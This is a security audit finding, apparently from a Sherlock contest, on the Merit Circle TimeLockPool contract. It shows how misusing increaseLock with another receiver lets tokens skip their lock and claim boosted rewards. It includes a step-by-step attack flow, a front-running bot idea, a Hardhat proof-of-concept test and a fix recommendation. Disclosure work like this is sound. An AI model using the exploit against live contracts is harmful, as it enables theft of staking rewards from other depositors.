# Lock time can be avoided

## Summary
User is able to avoid locking his tokens due to `increaseLock` function.
## Vulnerability Detail
When user [deposit](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L85-L107) some amount of tokens it is going to be locked for some [duration](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L92).
The protocol suppose that user can't [withdraw](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L121-L123) that tokens during that time.

However it's possible to deposit and withdraw tokens without lock.

This is the flow.
1. Attacker from account1 makes deposit with value 1 token for a minimum time(10 minutes). Now deposit with index 0 is [created](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L98-L103) for account1. 
2. After 10 minutes attacker from account2 makes deposit for 1 token but for the max amount of time(to get big tokens [multiplier](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L96)). Now deposit with index 0 is for account2.
3. Attacker from account2 calls `increaseLock(0, account1.address, bigAmount)`. It's important here to provide `account1` address as `_receiver` for `increaseLock` [function](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L197-L222). The function will check that lock for `account2` 0's deposit is not [expired](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L206-L208) yet. Then it will mint big amount of reward tokens(because of big lock amount of the deposit) and will [add](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/TimeLockPool.sol#L217-L218) minted tokens and deposited tokens to the `_receiver` same deposit with index 0(this is important to have deposits with same id).
4. Attcker somehow use minted tokens(to get rewards for example)
5. Attacker from `account1` can withdraw all deposited tokens. 
## Impact
This mechanism can be used to deposit money just before reward distribution to get the share and then witdhraw deposited tokens.

It's possible to create a bot that will front run transactions when rewards are [toped up](https://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/BasePool.sol#L95-L98) to deposit big amount of stake tokens. Then after that get rewards and withdraw tokens. All this can be done in 1 block. The only condition for attacker is to have mock deposit account already expired, but not withdrawn.
## Code Snippet
This code will show that this is possible

```solidity
it.only("Increasing lock for another receiver will broke system", async() => {
            await timeLockPool.deposit(DEPOSIT_AMOUNT, constants.MaxUint256, account1.address);
            const startUserDepostit = await timeLockPool.depositsOf(account1.address, 0);
            console.log("account 1 deposit amount: " + Number(startUserDepostit.amount._hex));
            const startBalance = await timeLockPool.balanceOf(account1.address);
            console.log("account 1 pool token balance: " + Number(startBalance._hex));

            let startBalanceOfAnotherAccount = await timeLockPool.balanceOf(account2.address);
            expect(startBalanceOfAnotherAccount).to.be.eq(0)

            //change lock for account2
            await timeLockPool.deposit(1, 0, account2.address);
            await timeTraveler.increaseTime(60 * 10 * 2);
            let anotherAccountDeposit = await timeLockPool.depositsOf(account2.address, 0);
            console.log("account 2 deposit amount after first deposit: " + Number(anotherAccountDeposit.amount._hex));
            let timelockTokenBalance = await timeLockPool.balanceOf(account2.address);
            console.log("account 2 pool token balance after first deposit: " + Number(timelockTokenBalance._hex));

            await timeLockPool.increaseLock(0, account2.address, INCREASE_AMOUNT);
            anotherAccountDeposit = await timeLockPool.depositsOf(account2.address, 0);
            console.log("account 2 deposit amount after increase lock: " + Number(anotherAccountDeposit.amount._hex));
            timelockTokenBalance = await timeLockPool.balanceOf(account2.address);
            console.log("account 2 pool token balance after increase lock: " + Number(timelockTokenBalance._hex));
            
            await timeLockPool.connect(account2).withdraw(0, account2.address);

            timelockTokenBalance = await timeLockPool.balanceOf(account2.address);
            console.log("account 2 pool token balance after withdraw: " + Number(timelockTokenBalance._hex));

            const depositTokenBalance = await depositToken.balanceOf(account2.address);
            console.log("deposit token balance: " + depositTokenBalance);
        });
```
## Tool used

Manual Review

## Recommendation
Check that lock of `_receiver` has not expired yet. And also calculate multiplier for the `_receiver` based on his deposit lock duration.
